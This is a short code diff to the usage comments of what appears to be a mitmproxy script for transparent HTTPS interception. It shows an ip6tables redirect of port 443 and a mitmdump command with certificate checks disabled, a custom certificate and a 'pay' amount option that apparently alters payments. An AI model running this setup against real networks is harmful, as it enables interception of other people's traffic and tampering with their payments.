@@ -13,7 +13,7 @@
 #  [OPTIONAL] ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
 #
 # 4. Fire up mitmproxy
-#  mitmdump --ssl-insecure --mode transparent --script /root/Desktop/https_mitm.py --set pay=[amount]
+#  mitmdump --ssl-insecure --certs *=/root/Desktop/mitm.pem --mode transparent --script /root/Desktop/https_mitm.py --set pay=[amount]
 #
 
 import re
